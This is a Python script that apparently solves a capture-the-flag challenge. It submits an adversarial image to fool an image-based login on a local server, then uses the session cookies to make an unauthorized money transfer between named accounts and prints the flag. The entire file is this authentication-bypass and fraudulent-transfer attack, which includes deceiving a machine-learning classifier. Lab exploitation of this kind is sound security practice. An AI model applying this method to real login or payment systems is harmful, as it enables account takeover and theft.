#!/usr/bin/env python3
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "requests",
# ]
# ///
import requests
import base64

def image_to_base64(image_path):
    try:
        with open(image_path, 'rb') as image_file:
            encoded_string = base64.b64encode(image_file.read()).decode('utf-8')
            return f"data:image/png;base64,{encoded_string}"
    except Exception as e:
        print(f"Error reading image {image_path}: {e}")
        return None

def test_login(server_url, image_path):
    image_data = image_to_base64(image_path)
    if not image_data:
        return None
    
    try:
        response = requests.post(f"{server_url}/login", 
                               json={"image_data": image_data},
                               headers={'Content-Type': 'application/json'})
        
        if response.status_code == 200:
            result = response.json()
            if result.get('success'):
                return response.cookies
    except Exception as e:
        pass
    
    return None

def test_transfer(server_url, cookies, from_account, to_account, amount):
    try:
        response = requests.post(f"{server_url}/transfer",
                               json={
                                   "from_account": from_account,
                                   "to_account": to_account,
                                   "amount": amount
                               },
                               cookies=cookies,
                               headers={'Content-Type': 'application/json'})
        
        if response.status_code == 200:
            result = response.json()
            if result.get('success'):
                print(f"Transfer successful!")
                if result.get('flag'):
                    print(f"FLAG: {result.get('flag')}")
                return True
    except Exception as e:
        pass
    
    return False





def main():
    server_url = "http://localhost:10001"
    adversarial_image = "img.png"
    
    print("Testing minhdk adversarial attack")
    print("Target: hungpd -> minhdk transfer")
    
    cookies = test_login(server_url, adversarial_image)
    if cookies:
        print("Login successful")
        transfer_success = test_transfer(server_url, cookies, "hungpd", "minhdk", 1)
        if transfer_success:
            print("SUCCESS! Transfer successful")
        else:
            print("Transfer failed")
    else:
        print("Login failed")

if __name__ == "__main__":
    main()